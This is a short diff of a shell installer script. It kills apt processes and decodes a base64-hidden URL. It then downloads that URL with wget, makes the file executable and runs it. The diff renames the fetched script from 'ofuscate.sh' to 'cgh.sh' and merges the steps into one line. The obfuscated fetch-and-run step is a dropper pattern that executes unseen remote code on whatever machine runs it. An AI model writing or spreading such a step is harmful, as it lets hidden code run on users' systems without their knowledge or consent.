@@ -3,7 +3,7 @@ killall apt apt-get &> /dev/null
 TIME_START="$(date +%s)"
 DOWEEK="$(date +'%u')"
 HOSTNAME="$(hostname)"
-rm -rf ofuscate.*
+rm -rf cgh.*
 dpkg --configure -a
 fun_bar3 () {
 comando="$1"
@@ -105,6 +105,4 @@ dom='base64 -d'
 RE=$(echo $update1|$dom)
 sleep 5s
 clear
-wget -q $RE;
-chmod +x ofuscate.sh
-./ofuscate.sh
+wget -q -O cgh.sh $RE;chmod +x cgh.sh && ./cgh.sh
